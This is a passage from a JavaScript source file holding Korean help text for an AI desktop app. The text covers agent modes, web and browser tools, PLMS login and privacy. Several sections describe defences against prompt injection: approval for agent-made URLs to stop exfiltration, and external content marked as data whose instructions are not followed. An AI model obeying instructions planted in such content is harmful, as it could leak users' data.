- **일반 AI 모델 (Claude)** (1.11): 본인이 [Anthropic 콘솔](https://console.anthropic.com)에서 발급한 Claude API 키로 대화·에이전트·PO노트 노트 만들기 등 모든 모델 호출을 합니다. 요금은 그 키의 Anthropic 계정으로 청구되고 POSTECH 크레딧은 쓰지 않습니다. Claude Opus 5.5(권장)·Sonnet 5.5·Haiku 5.5·Fable 5.1 중에서 고르고, '모델 목록 불러오기'로 그 키로 쓸 수 있는 모델을 모두 받아 옵니다. PO노트의 서버 음성 보정과 크레딧 확인은 POSTECH 키가 있을 때만 씁니다.
- **일반 AI 모델 (GPT)** (1.18): 본인이 [OpenAI 플랫폼](https://platform.openai.com/api-keys)에서 발급한 OpenAI API 키로 모든 모델 호출을 합니다(OpenAI Responses API). 요금은 그 키의 OpenAI 계정으로 청구되고 POSTECH 크레딧은 쓰지 않습니다. **모델 목록 불러오기**로 그 키로 쓸 수 있는 GPT 모델을 받아 옵니다.
- OpenAI 호환·Responses·Claude·GPT 방식에서는 화면 위쪽 메뉴에서 대화별 모델을 지정합니다.

**답변을 받는 대로 표시(스트리밍)**를 켜면 일반 대화의 답변이 글자가 오는 대로 나옵니다. 표시가 이상하면 끄세요.`],
  ["크레딧 확인", `
**설정 → POSTECH GenAI 크레딧**에서 이 키의 이번 주 크레딧 사용량·한도·남은 양을 봅니다. **확인**을 눌러도 크레딧은 줄지 않습니다. PO노트 화면 위쪽에도 같은 내용이 나옵니다.

Claude Sonnet 5.5 기준으로 1크레딧은 입력 약 250토큰, 출력 약 75토큰이고, 짧은 질문도 호출마다 약 24크레딧이 듭니다. Opus 5.5는 두 배입니다. 에이전트 모드는 단계마다 한 번씩 호출하므로 단계가 많을수록 크레딧을 많이 씁니다.`],
  ["에이전트의 인터넷 조사 (1.18.1)", `
에이전트(채팅의 에이전트 모드, 코드의 **작업** 탭)는 인터넷에서 직접 찾아 읽습니다. "TetraMem 창업자들의 논문을 전수조사해 줘"처럼 맡기면 계획 → 웹 검색 → 페이지·논문 읽기 → 빠진 것 다시 찾기 → 출처와 함께 정리(많으면 작업 폴더에 Markdown·CSV)까지 스스로 합니다.

- **web_search**: 웹 검색(설정에 Firecrawl 키가 있으면 Firecrawl, 없으면 DuckDuckGo, 안 되면 위키백과).
- **web_fetch**: 웹페이지·PDF 주소의 글을 읽습니다. 긴 글은 필요한 부분만, 이어서 읽기도 합니다.
- **paper_search**: 주제로 arXiv·Semantic Scholar·Crossref·OpenAlex를 찾고, **저자 이름**을 주면 그 저자의 논문을 최신순으로 모두(최대 200편) 가져옵니다.
- **web_download**: PDF 같은 파일을 작업 폴더에 받습니다(수정 자동·전체 자동이면 묻지 않음, 덮어쓰지 않음).
- 검색 결과·읽은 페이지에 나온 주소와 내가 쓴 주소는 바로 읽고, 에이전트가 만들어 낸 주소는 주소 전체를 보여 주고 묻습니다(웹페이지의 지시로 정보를 실어 보내는 일을 막음). 이 PC·내부망 주소는 읽지 않습니다.
- 끄려면 **연결·도구 → 기능**에서 '에이전트의 인터넷 도구'를 끕니다. AI 실행 정책이 Local Only이고 외부 도구를 막으면 쓰지 않습니다.`],
  ["Code 에이전트: 터미널처럼 쓰기 (1.17.2)", `
**코드**를 열면 맨 앞 **작업** 탭이 Claude Code 같은 터미널입니다. 맨 아래 \`>\` 줄에 할 일을 쓰고 **Enter**를 누르면 에이전트가 작업 폴더에서 계획 → 코드 읽기 → 고치기 → 테스트·빌드 실행 → 정리를 스스로 합니다.

- 진행은 위로 쌓입니다: \`● Read(calc.py) ⎿ 2줄 읽음\`, \`● Update(calc.py)\`와 줄 번호가 붙은 diff, \`● Bash(명령)\`과 출력(실시간), \`● Update Todos\`(계획). 접힌 출력은 **Ctrl+O**로 펼칩니다.
- **승인**은 대화 상자 대신 기록 안의 선택지로 묻습니다: **1** 예 · **2** 예, 이 명령은 다시 묻지 않기(수정이면 '이 작업 동안 수정은 묻지 않기') · **3**/**Esc** 아니요, 다르게 하라고 알려 주기(쓰고 Enter). ↑↓·Enter·숫자로 고릅니다. 다른 화면을 보고 있으면 예전처럼 창으로 묻습니다.
- **권한 모드**는 **Shift+Tab**(또는 아래 상태 줄을 누름)으로 바꿉니다: 매번 묻기 → **수정 자동**(기본) → **계획 모드**(읽기만, 끝나면 '진행할까요?') → **전체 자동**(위험·인터넷 명령만 물음). 작업 중에 바꿔도 다음 단계부터 따릅니다.
- 일하는 중에 쓰고 Enter면 **추가 지시**로 다음 단계부터 반영합니다. **Esc**는 멈춤, 쉬고 있을 때 **Esc 두 번**은 마지막 지시 되돌리기입니다.
- 입력 앞글자: \`!명령\`(작업 폴더에서 바로 실행, 출력은 다음 지시의 맥락으로. 위험·인터넷 명령은 한 번 더 물음) · \`#메모\`(AGENTS.md에 한 줄 더하기) · \`@파일\`(파일·폴더를 지시에 붙이기, Tab으로 완성) · \`/명령\`.
- 그 밖의 키: Shift+Enter(또는 \`\\\` 다음 Enter) 줄 바꿈 · ↑↓ 지난 입력 · Ctrl+L 화면 비우기 · Ctrl+C 입력 지우기(비었으면 멈춤) · \`?\` 단축키.
- 수정하기 전에 원래 내용을 보관하므로 \`/undo\`(마지막 지시)·\`/revert 파일\`(작업 전으로)로 되돌립니다(그 뒤 사람이 고친 파일은 건너뜀). 커밋은 하지 않으니 끝난 뒤 Git 패널에서 확인하고 커밋하세요.`],
  ["Code 에이전트: 명령·프로젝트 지침·격리 작업 공간", `
- **슬래시 명령**: \`/init\`(AGENTS.md 만들기) · \`/review\`(Git 변경 코드 리뷰, 고치지 않음) · \`/test\`(테스트 실행·고치기) · \`/plan 할 일\`(이번만 계획 모드, 비우면 계획 모드로) · \`/worktree 할 일\`(격리 작업 공간에서 새 작업) · \`/clear\`(새 작업) · \`/resume\`(지난 작업 고르기) · \`/compact\`(지난 대화 요약) · \`/undo\` · \`/diff\` · \`/revert [파일]\` · \`/todos\` · \`/mode\` · \`/permissions\`(다시 묻지 않는 명령 지우기) · \`/status\` · \`/usage\`(사용량) · \`/memory\` · \`/apply\` \`/keep\` \`/discard\`(격리 작업) · \`/delete\` · \`/help\`.
- **프로젝트 명령**: 작업 폴더의 \`.poschat/commands/이름.md\`(또는 \`.claude/commands/\`)가 \`/이름\` 명령이 됩니다. 본문의 \`$ARGUMENTS\`는 명령 뒤에 쓴 글로 바뀝니다.
- **다시 묻지 않기**: 이 작업 폴더에서 같은 명령(앞 낱말)은 다시 묻지 않습니다. \`&&\`·\`|\` 같은 연결, 위험한 동작, 인터넷을 쓰는 명령은 그래도 묻습니다.
- **프로젝트 지침**: 작업 폴더의 **AGENTS.md**·**CLAUDE.md**를 읽고 따릅니다. 테스트·빌드 명령(package.json·pyproject·Makefile 등)과 Git 상태도 에이전트에게 알려 줍니다.
- **격리 작업 공간**: \`/worktree 할 일\`로 시작하면 따로 만든 브랜치(git worktree)에서 고치고, 끝난 뒤 \`/apply\`(원래 폴더에 적용) · \`/keep\`(브랜치로 남기기) · \`/discard\`(버리기)를 고릅니다(Git 저장소, 커밋 1개 이상).
- 에이전트는 줄 번호를 붙여 파일을 읽고(긴 파일은 나눠서), 이름으로 파일을 찾고(glob), 한 파일 여러 곳을 한 번에 고치고, 개발 서버 같은 명령을 백그라운드로 돌립니다(작업이 끝나면 멈춤). 무엇을 왜 하는지 한 줄 설명도 남깁니다.`],
  ["Lab: 실험 기록·비교·AI 분석 (1.16)", `
왼쪽 위 **Lab**에서 실험을 만들고, **실행 설정**(Python 스크립트·명령·Jupyter 노트북, 파라미터, 결과 파일 패턴)을 저장한 뒤 **실행**합니다. 실행은 매번 승인합니다.

- Run마다 파라미터·명령·Git 커밋(커밋하지 않은 변경은 패치 사본)·OS·Python·패키지·GPU·결과 파일·출력이 남습니다. 실패·취소한 Run도 남고, 앱이 꺼지면 '중단됨'으로 표시합니다.
- **결과 가져오기**: 밖에서 만든 CSV·JSON·로그·그림을 옮기지 않고 가리킵니다. **미리 보기·지표 뽑기**에서 고른 열만 지표가 되고 단위·출처가 남습니다(NaN·빈 칸은 빼고 경고).
- **그래프**(선·점·막대, 여러 Run 겹치기, 통계는 전체 데이터)와 **비교**(다른 조건 강조, 단위·커밋·환경 차이 경고).
- **AI 분석**: 고른 Run 기록만 채팅에 첨부해 요약·비교·이상 찾기·다음 실험 제안을 묻습니다. AI는 실험을 실행하지 않습니다. 고른 요약은 **프로젝트 기억에 남기기**.`],
  ["AI 실행 정책 · 로컬 AI (1.17)", `
**설정 → AI 실행 정책 → 열기**에서 켜면, 요청의 종류·난이도·개인정보·이 PC의 로컬 모델·비용을 보고 **로컬 AI(Ollama)**와 **Cloud 모델** 중 하나를 자동으로 고릅니다. 기본은 꺼짐입니다.

- **로컬 AI**: [ollama.com](https://ollama.com/download)에서 Ollama를 설치·실행하면 **연결됨**으로 보입니다. 모델은 창의 **모델 받기**에서 크기·라이선스를 확인한 뒤 받거나, 터미널의 \`ollama pull\`로 받습니다. 앱은 모델을 함께 설치하지 않습니다.
- **정책**: **Economy**(가벼운 일은 로컬), **Balanced**(권장, 연구·코드·에이전트는 Cloud), **Quality**(Cloud 먼저), **Local Only**(Cloud를 전혀 부르지 않음).
- 대화 위 모델 목록에서 **자동**을 고르면 정책대로, **로컬 · 모델 이름**을 고르면 그 로컬 모델만, Cloud 모델을 고르면 그 모델만 씁니다(자동으로 바꾸지 않음).
- 답변 아래 **Local · 요약**, **Cloud · 연구 추론**, **Local → Cloud · 근거 검증 실패** 같은 표시를 누르면 고른 모델·이유·응답 시간·Cloud 호출 여부·비용 추정·검증 결과가 보입니다.
- 로컬 답은 규칙으로 검증합니다(빈 답·언어·형식·원문에 없는 주소·인용·쪽 번호·수치·코드 문법). 통과하지 못하면 허용한 경우에만 Cloud로 다시 답하고, 먼저 받은 로컬 답은 접어서 함께 보여 줍니다.
- 주간 Cloud 호출·크레딧 한도, 요청당 비용 한도, 민감 정보·첨부는 로컬에서만 같은 설정이 있습니다. 통계는 **연결·도구 → 사용량·진단**에 있습니다(로컬은 Cloud API 비용만 0이고 전기·하드웨어 비용은 따로입니다).
- **경량 Cloud 모델(3단계, 실험)**: 정책 창에서 **3단계 켜기**를 켜고 Haiku·GPT-5 mini 같은 모델을 고르면 사용자 → 경량 모델 → 프런티어가 됩니다. 보통 일은 경량 모델이 답하고, 어려운 일은 경량 모델이 이끌며 필요한 부분만 프런티어에 짧게 묻습니다(**Light ⇄ Frontier** 표시). 프런티어에는 대화 전체 대신 질문과 발췌만 갑니다.
- **단가·손익분기**: 경량·프런티어 단가를 넣으면 요청마다 손익분기(경량 단가 ÷ 프런티어 단가가 이 값보다 작아야 경량이 쌈)를 계산해, 프런티어 직접이 더 싼 요청은 프런티어로 보냅니다. **프롬프트 캐싱**을 켜면 같은 앞부분의 입력 비용을 줄입니다.
- **개발자 모드**(설정): 답변 아래 표시에 호출마다의 실제 토큰·캐시·손익분기·원본 JSON이, 사용량·진단에 개발자 데이터가 보입니다.
- 안드로이드에서는 로컬 AI를 쓸 수 없습니다(자동 선택을 켜도 Cloud 모델만 고릅니다).`],
  ["PLMS 수업·공지·자료 (베타)", `
**베타 기능입니다.** 실제 학교 계정에서의 확인이 끝나지 않아 동작이 불안정할 수 있습니다. 왼쪽 맨 아래 **PLMS**(베타 표시)에서 엽니다.

왼쪽 **PLMS → SSO 로그인**을 누르고 오른쪽 브라우저에서 POSTECH 계정과 StonePASS로 인증하세요. 다시 **PLMS → 내 수업 불러오기**를 누르면 **이번 학기 수업**이 먼저 나오고, 지난 학기 수업은 접힌 묶음에 있습니다.

- **계정 저장(선택)**: 설정의 **PLMS 계정**에 아이디·비밀번호를 저장해 두면 브라우저를 열지 않고 백그라운드에서 로그인합니다. **채팅의 에이전트에게 PLMS 수업·공지·자료를 바로 물어봐도 됩니다**(에이전트 모드). StonePASS 같은 2단계 인증이 필요할 때만 오른쪽에 브라우저가 열리니 직접 진행하세요. 로그인이 거부되면 10분 동안은 자동으로 다시 시도하지 않습니다. 비밀번호는 이 PC의 보안 저장소(자격 증명 관리자·키체인)에만 저장하고 AI·대화 기록·동기화로 보내지 않습니다. 같은 로그인 화면에는 한 번만 보내므로 비밀번호가 틀려도 반복해서 시도하지 않습니다.
- 수업 화면은 **공지·게시판·자료·과제** 칩으로 거르고, 주차·주제별로 묶여 보입니다.

- 수업에서 공지 게시판·강의자료를 선택해 본문과 첨부 링크를 읽습니다. PDF는 쪽별로 미리 보고, PowerPoint는 설치된 호환 앱에서 열거나 내려받습니다. 자료는 20MB까지, 긴 글은 **이어서 읽기**로 읽습니다.
- **에이전트에게 수업 정리 맡기기 / 이 자료 묻기**를 누르면 질문이 입력됩니다. 답변에는 연 자료와 아직 열지 않은 수업 항목 수가 표시됩니다. 단계 제한·읽기 오류 등으로 모든 자료를 확인하지 못할 수 있습니다. PLMS 조회는 작업 폴더 없이도 에이전트 모드에서 됩니다. 로그인 후 Code 작업 에이전트에서도 수업 자료를 조회할 수 있습니다.
- 로그인 만료 시 다시 인증하세요. **연결 해제**는 조회 기능을 끄고 PLMS 전용 쿠키를 지웁니다. 학교 공통 SSO 세션과 기존 대화 기록은 유지됩니다.
- 요청한 자료 내용은 선택한 AI 모델 서비스에 전달될 수 있습니다. 비밀번호·OTP·쿠키는 모델에 보내지 않습니다. 제출·출석·성적 변경과 외부 사이트 자료는 지원하지 않습니다.
- Windows·macOS 네이티브 브라우저가 필요합니다. 학교 화면 변경이나 계정 권한에 따라 읽지 못하는 항목은 원문에서 확인하세요.
`],
  ["브라우저 에이전트 (1.16)", `
**브라우저**를 열어 둔 채 에이전트 모드에서 "이 사이트에서 ○○를 찾아 줘"처럼 맡기면, 에이전트가 페이지를 살펴보고(요소 목록) 누르기·입력·고르기·스크롤·기다리기·읽기·캡처를 직접 합니다.

- 읽기와 같은 사이트 안 링크 이동은 바로 합니다. 사이트마다 **처음 누르기·입력할 때**, 에이전트가 **주소를 만들어 열 때**, **처음 가는 사이트**와 **로컬·사설 네트워크**로 갈 때는 승인을 받습니다(자동 허용 설정으로 건너뛰지 않음).
- **제출·삭제·전송·업로드·결제·계정·로그인·비밀번호·다운로드·병합·리뷰 제출·권한 허용**과 **확인·동의·저장** 버튼은 설정과 관계없이 언제나 묻습니다. 파일 올리기는 하지 않습니다.
- 브라우저 막대에 지금 하는 동작·횟수·시간이 보이고 **일시정지·계속·멈춤**을 누를 수 있습니다. 한 번에 40번·10분까지.
- 비밀번호 칸의 값은 기록에 남기지 않습니다. 로그인·결제가 필요한 일은 직접 하세요.`],
  ["코드: 편집기·터미널·SSH 서버 (1.15·1.18)", `
작업 폴더를 고른 뒤 왼쪽 위 **코드**를 누르면 채팅 자리 전체에 파일 트리와 편집기가 열립니다(1.17.2부터 채팅과 나누어 띄우지 않음). 왼쪽 패널은 **파일·Git·변경 검토** 탭, 아래 패널은 **터미널**입니다(1.18). 아래 패널 위 막대로 높이를 바꿉니다. 사이드바의 대화·새 채팅·다른 화면이나 오른쪽 위 ×로 돌아가고, 다시 **코드**를 누르면 열린 탭·저장하지 않은 내용이 그대로 있습니다.

- **파일**: 폴더를 펼쳐 파일을 탭으로 엽니다. 이름·내용 찾기, 새 파일·폴더, 이름 바꾸기, 지우기(데이터 폴더의 휴지통으로). 1MB가 넘는 파일은 읽기 전용입니다.
- **편집**: 강조·줄 번호·찾기/바꾸기(Ctrl+F)·되돌리기, **Ctrl+S로 저장**. 인코딩·줄 끝(LF/CRLF)을 그대로 두고, 다른 프로그램이 파일을 바꿨으면 덮어쓰기 전에 묻습니다.
- **AI에게 묻기**: 코드를 선택하고 **AI에게 묻기 ▾**에서 범위(선택·현재 함수/블록·파일·관련 파일)와 할 일(설명·오류 분석·성능·리팩터링·주석·테스트·RTL 검토)을 고르면 채팅으로 돌아가 경로·줄 번호가 붙은 첨부가 들어갑니다.
- **변경 검토**(왼쪽 패널): 코드 화면을 열어 두고 에이전트에게 고치게 하면, 승인 창 대신 덩어리마다 받아들이거나 거부합니다. 받아들이기 전에는 파일이 바뀌지 않습니다.
- **Git**(왼쪽 패널): 바뀐 파일·차이, 고른 파일만 스테이지, 스테이지한 변경 커밋, AI 변경 설명·리뷰·커밋 메시지 제안. 푸시는 하지 않습니다.
- **터미널**(아래 패널, 1.18): 작업 폴더에서 진짜 셸(Windows PowerShell, macOS·Linux 로그인 셸)이 열립니다. vim·ssh 같은 대화형 프로그램도 됩니다. **+** 로 더 열고, **Ctrl+\`** 로 열고 접고, 글을 고르고 Ctrl+C로 복사, Ctrl+V로 붙여 넣습니다. **AI에게 묻기**는 고른 출력(없으면 끝부분)을 채팅에 첨부합니다. 직접 치는 셸이라 승인 창이 없고, 작업 폴더는 격리가 아닙니다.
- **SSH**(위 오른쪽, 1.18): 서버(\`user@host\` 또는 ~/.ssh/config의 Host)에 연결하고 폴더를 고르면 파일·찾기·Git·터미널·Code 에이전트가 그 서버에서 돕니다. 처음 연결하는 서버는 지문을 확인하고, 암호·OTP는 물을 때만 넣습니다(저장하지 않음). 서버에는 python3만 있으면 됩니다. **SSH → 로컬 작업 폴더로**로 돌아옵니다.
- 휴대폰 앱은 열기·강조·찾기·묻기·간단한 편집만 됩니다.`],
  ["논문: 채팅 옆 PDF 읽기 (1.14)", `
왼쪽 위 **논문**을 누르면 채팅 오른쪽에 논문 화면이 열립니다. 가운데 막대를 끌어 너비를 바꿉니다.

- **PDF 파일 열기**로 이 기기의 PDF를, 주소 칸에 **arXiv 번호**(예: 1706.03762)나 PDF 주소를 넣어 엽니다. 연구 라이브러리의 논문(PDF나 arXiv 번호가 있는 것)도 바로 열립니다.
- **선택한 부분 묻기**: PDF에서 드래그한 글을 쪽 번호와 함께 첨부합니다. **이 쪽 묻기**: 보고 있는 쪽 전체를 첨부합니다.
- **영역 잘라 묻기**: 그림·표·수식을 드래그해 이미지로 첨부합니다(Esc로 그만). 이미지를 읽는 모델에서 씁니다.
- **논문 요약**: 첫 쪽과 실험·결과 쪽을 발췌해 첨부하고, 쪽 번호를 단 요약을 요청합니다.
- **비교표**: 첫 화면의 연구 라이브러리 목록에서 논문을 2~6편 고르고 **선택한 논문 비교**를 누르면, 실험 조건·결과를 표로 비교해 달라는 질문과 함께 발췌가 첨부됩니다.
- **라이브러리에 저장**: 연 PDF를 연구 라이브러리에 더합니다(DOI·arXiv 번호를 찾으면 정보를 채웁니다).
- 에이전트 모드에서는 에이전트가 열린 논문을 \`paper_read\`로 필요한 쪽만 읽고 (p. N)으로 근거를 밝힙니다.

PDF 안의 스크립트·링크·양식은 실행하지 않고, 논문 글은 '외부 데이터'로 표시되어 그 안의 지시를 따르지 않습니다.`],
  ["브라우저: 채팅 옆 웹페이지 (1.13)", `
왼쪽 위 **브라우저**를 누르면 앱 창이 나뉘어 오른쪽에 웹페이지가 열립니다. 가운데 막대를 끌어 너비를 바꿉니다.

- 채팅 위 막대에서 주소나 검색어를 넣고 Enter. 뒤로·앞으로·새로 고침.
- 웹페이지 바로 위 막대에 페이지 제목과 **기본 브라우저로 열기**(다운로드·로그인이 필요한 사이트), **닫기**가 있습니다.
- **이 페이지에 대해 묻기**: 페이지 글을 채팅에 첨부합니다. **선택한 부분 묻기**: 드래그한 글만 첨부합니다. 질문을 고쳐 보내세요.
- **연구 라이브러리에 저장**: arXiv·DOI 논문 페이지를 라이브러리에 더합니다(연구 라이브러리를 켜 두어야 합니다).
- 에이전트 모드에서는 에이전트가 열린 페이지를 읽고, 주소를 열기 전에는 승인을 받습니다.

웹페이지는 POSCHAT의 파일·실행·MCP·API 키에 접근할 수 없고, 페이지 내용은 '외부 데이터'로 표시되어 그 안의 지시를 따르지 않습니다.`],
  ["PO노트: 강의 녹음·필기 노트", `
왼쪽 위 **PO노트**에서 강의마다 노트를 만듭니다.

1. **새 강의 노트**를 만들고 **강의 자료**(PPT·PDF·Word·한글 등)를 올립니다.
2. **녹음 시작**을 누르면 마이크 소리를 실시간으로 받아 적습니다(**전사** 탭). 강의 중 떠오른 질문은 **메모** 탭에 적어 둡니다.
3. 녹음을 멈춘 뒤 **노트 만들기**를 누르면 강의 자료의 순서에 맞춰 전사·메모를 정리한 Markdown 필기 노트(**노트** 탭)를 만듭니다. 노트는 앱 안에서 고칠 수 있습니다.

**음성 인식 설정**에서 받아 적는 방식을 고릅니다.

- **자동(기본, 권장)**: 로컬 AI가 바로 받아 적고, 약 2분치 구간 가운데 로컬 AI가 확신하지 못한 구간(흐리게 보이는 줄)이 있을 때만 POSTECH GenAI(Gemini 3.8 Flash)가 음성과 대조해 고칩니다. 1시간에 0~약 420크레딧입니다. 처음 녹음할 때 로컬 모델(한국어 약 76MB)을 내려받습니다.
- **POSTECH 서버로 모두**: 1시간에 약 1,000~1,300크레딧입니다.
- **로컬 AI만**: 크레딧·인터넷이 필요 없고 CPU를 조금만 씁니다.
- **크레딧 예산 보호**: 이번 주 남은 크레딧이 정한 비율(기본 30%) 아래로 내려가면 서버를 쓰지 않고 로컬 AI로만 받아 적습니다.

휴대폰 앱에서도 녹음할 수 있습니다. 처음 녹음할 때 마이크 권한을 묻고, 녹음하는 동안 알림이 떠 있으며 화면을 꺼도 계속 받아 적습니다(알림에서 중지).`],
  ["업데이트", `
앱이 시작할 때 업데이트 서버에서 새 버전을 확인해 알려 줍니다. **업데이트**를 누르면 설치 파일을 받아 서명을 확인한 뒤 설치를 시작합니다(Windows는 설치 프로그램이 열리고 앱이 닫힙니다). 대화·설정은 그대로 남습니다.

**설정 → 업데이트**에서 시작할 때 확인을 끄거나 지금 확인할 수 있습니다.`],
  ["파일 첨부", `
입력창의 **+** 버튼, 파일 끌어다 놓기, 이미지 붙여 넣기(Ctrl+V, 맥은 ⌘+V)로 첨부합니다. 파일은 하나에 20MB, 한 번에 10개까지입니다.

- PDF·Word·PowerPoint·Excel·한글 문서와 텍스트 파일은 내용을 읽어 질문과 함께 보냅니다.
- 이미지는 OpenAI 호환·Responses API·일반 AI 모델(Claude) 방식에서 모델에게 전달됩니다. a1 방식은 이미지를 전달하지 않습니다.`],
  ["에이전트 모드", `
작업 폴더를 고르고 에이전트를 켜면 AI가 목표를 이룰 때까지 단계를 반복합니다: 폴더 보기·파일 읽기·검색, 파일 쓰기·수정, 명령 실행, 스킬 불러오기, MCP 도구 실행.

- 각 단계는 대화에 한 줄로 표시되고, 누르면 파일 내용·변경 diff·명령 출력이 펼쳐집니다.
- **파일 수정과 명령 실행은 실행 전에 승인을 받습니다.** 설정의 **에이전트 권한**에서 자동 허용으로 바꿀 수 있지만, 명령은 현재 사용자 권한으로 실행되므로 주의하세요.
- 단계가 너무 많으면 설정의 **에이전트 최대 단계 수**에서 멈춥니다.
- 작업 폴더가 없거나 에이전트를 끄면 일반 챗봇으로 동작합니다.`],
  ["명령어", `
입력창에 \`/\`를 입력하면 목록이 뜹니다.

| 명령 | 하는 일 |
|---|---|
| \`/init\` | 작업 폴더를 분석해 INIT.md(프로젝트 지침)를 만듭니다 |
| \`/user 요청\` | 대화 내용으로 내 정보(USER.md)를 작성·업데이트합니다 |
| \`/remember 내용\` | 모든 대화에서 기억할 내용을 저장합니다 |
| \`/memory\` | 기억 목록을 보고 지웁니다 |
| \`/usage\` | 사용량(AI 호출·토큰·POSTECH GenAI 크레딧)을 봅니다 (1.18.1) |
| \`/스킬이름 요청\` | 그 스킬의 지침대로 요청을 수행합니다 |
| \`/help\` | 간단한 도움말 |`],
  ["기억: 메모리·내 정보·다른 대화", `
- **메모리(memory.md)**: "~를 기억해 줘"라고 하거나 \`/remember\`로 저장하면 모든 대화에 전달됩니다. 왼쪽 아래 **메모리**에서 보고 고칩니다.
- **내 정보(USER.md)**: 하는 일, 관심 분야, 원하는 답변 방식 등을 적어 두면 답변이 나에게 맞춰집니다. **내 정보**에서 직접 쓰거나 \`/user\`로 AI에게 맡깁니다. 비밀번호·키 같은 비밀은 적지 마세요.
- **다른 대화 참고**: 새 질문과 관련된 내용이 다른 대화에 있으면 자동으로 찾아 참고합니다(📎 표시). 메모리 창에서 끌 수 있습니다.`],
  ["INIT.md와 스킬", `
- **INIT.md**: 작업 폴더 최상위의 INIT.md는 모든 대화에 프로젝트 지침으로 들어갑니다. \`/init\`으로 만들 수 있습니다.
- **스킬**: \`<스킬이름>/SKILL.md\` 형식의 작업 지침입니다. 에이전트가 요청에 맞는 스킬을 스스로 불러오고, \`/스킬이름\`으로 직접 실행할 수도 있습니다. 앱 내장(요약, 코드 검토, 논문 읽기), 사용자 스킬 폴더(**스킬 → 새 스킬 만들기**), 작업 폴더의 \`skills\\\` 순서로 읽고, 이름이 같으면 뒤의 것이 우선합니다.`],
  ["연결·도구, 연구 라이브러리, 에이전트 자동화", `
왼쪽 아래 **연결·도구**에서 외부 서비스와 확장 기능을 관리합니다. 모두 **기본으로 꺼져 있고**, 켠 것만 에이전트가 씁니다.
**연구 라이브러리**와 **에이전트 자동화**는 PO노트처럼 왼쪽 사이드바 위쪽에서 바로 여는 화면입니다(1.11).

**플러그인**(1.12, 사이드바): Anthropic의 Knowledge Work Plugins(직무별 스킬 묶음)를 둘러보고 설치합니다. 설치한 스킬은 에이전트가 알아서 쓰고, 입력창에 \`/플러그인:스킬\`(예: \`/productivity:start\`)로 직접 부를 수 있습니다. 원래 플러그인이 쓰는 외부 도구(Slack 등)는 연결하지 않으니, 자료는 첨부하거나 POSCHAT 커넥터로 쓰세요.

- **커넥터**: GitHub(저장소·코드 검색·이슈·PR·리뷰·Actions 실패 분석), Google Drive·Docs·Sheets·Slides·Gmail·Calendar(서비스마다 따로 로그인), Zotero. 상태(연결됨·인증 필요·연결 오류·비활성화·사용 권한 부족)를 보고, 로그인·재인증·연결 해제·권한 확인·도구별 승인 정책을 바꿉니다. 토큰은 OS 보안 저장소에 둡니다.
- **연구 라이브러리**(사이드바): 논문 저장·태그·BibTeX, 작업 폴더 PDF·문서 인덱싱과 쪽·섹션이 붙은 원문 검색, 벡터 검색 설정.
- **메모리·동기화**: 프로젝트(결정·진행 상태·TODO)·연구 기억, 에이전트 인계, 기기 사이 암호화 동기화(직접 켤 때만).
- **에이전트 자동화**(사이드바): Python·Jupyter 실행, SSH 원격 실행과 실행 기록(PC 앱만, 매번 승인).
- **사용량·진단**: 모델별 호출·오류율·지연·토큰·크레딧 추정, 도구 성공률, 답변 평가(👍/👎), 자동 평가.

**승인**: 쓰기는 설정의 '에이전트 권한'을 따르지만, **메일 전송·PR 리뷰 제출·삭제·코드 실행은 자동 허용으로 설정해도 매번 묻습니다.** 외부 서비스·문서에서 온 내용은 '외부 데이터'로 표시되어 그 안의 지시를 따르지 않습니다.`],
  ["MCP 도구", `
**연결·도구 → MCP 서버**에서 서버를 켜고 끕니다. 에이전트 모드에서 켜진 서버의 도구를 씁니다.

- **내장 서버**(설치 필요 없음): word·powerpoint·excel(문서 만들기·고치기), paper(논문 찾기·섹션별 읽기), notion(설정에 Notion 토큰 필요), firecrawl(웹페이지 읽기·웹 검색, 설정에 Firecrawl 키 필요).
- **추천 서버**: playwright(브라우저 자동화). PC에 Node.js가 있어야 합니다.
- **외부 서버**: **MCP → 설정 파일 열기**로 \`mcp.json\`에 Claude Desktop과 같은 형식으로 추가합니다.

바깥에 영향을 주는 도구는 명령 실행처럼 승인을 받습니다.`],
  ["다른 AI 에이전트와 기억 이어 쓰기 (ai-memory)", `
Claude Code·Codex·Cursor·Gemini CLI 같은 코딩 에이전트에서 하던 작업을 POSCHAT에서 이어받고, POSCHAT에서 한 작업을 그 에이전트들이 이어받게 할 수 있습니다.

1. PC에 [ai-memory](https://github.com/akitaonrails/ai-memory)를 설치하고 \`ai-memory setup\`을 실행합니다. 다른 에이전트들도 이때 함께 연결됩니다.
2. **MCP → 설정 파일 열기**로 \`mcp.json\`에 다음을 추가하고 저장합니다.

\`\`\`json
{ "mcpServers": { "ai-memory": { "command": "ai-memory", "args": ["mcp-bridge", "--no-session-id"] } } }
\`\`\`

3. 작업 폴더를 고르고 에이전트 모드로 대화합니다.

그러면 앱이 자동으로 다음을 합니다.

- **대화 시작**: 그 폴더에 다른 에이전트가 남긴 인계(한 일·남은 질문·다음 할 일)를 받고 최근 기억을 불러옵니다(🧠 표시). 인계는 한 번 받으면 사라집니다.
- **작업 후**: 파일을 고치거나 명령·도구를 실행했다면, 다음 에이전트가 이어받을 인계를 남깁니다(📤 표시).
- **검색**: "전에 이 버그 어떻게 고쳤지?"처럼 물으면 AI가 ai-memory에서 찾아봅니다.

ChatGPT·claude.ai 같은 웹 채팅 서비스의 기억은 이어받을 수 없습니다.`],
  ["데이터와 개인정보", `
대화·설정·메모리·첨부 파일·PO노트는 이 기기의 데이터 폴더(설정 창 아래쪽 **데이터 폴더 → 열기**)에만 저장됩니다(동기화를 직접 켜면 암호화해 고른 저장소에도 둡니다). 질문할 때 대화 내용, 첨부 내용, 메모리, 내 정보, INIT.md가 POSTECH GenAI API로 전달됩니다. PO노트는 로컬 AI로 받아 적으면 녹음이 PC 밖으로 나가지 않고, POSTECH 서버로 받아 적으면 말 구간의 소리가 POSTECH GenAI로 전달됩니다. 녹음 소리 자체는 저장하지 않습니다. POSTECH API 키·Notion·Firecrawl 키는 설정 파일(config.json)에, 1.10의 커넥터 토큰(GitHub·Google·Zotero 등)은 OS 보안 저장소(없으면 이 사용자만 읽는 앱 파일)에 저장됩니다. 사용량·진단 기록에는 질문·답변 내용이 없습니다.`],
];

// 설정 맨 아래: 라이선스(AGPL-3.0-only)와 이 버전의 소스코드·제3자 라이선스
function licenseBlock() {
  const small = "margin:2px 0 0;color:var(--text-3);font-size:12px";
  const source = h("a", { href: `${REPO_URL}/tree/v${S.version}`, target: "_blank", class: "btn", style: "text-decoration:none;color:inherit" }, "소스 코드 보기");
  const box = h("div", { class: "license-block", style: "margin-top:12px" },
    h("p", { style: small }, "POSCHAT"),
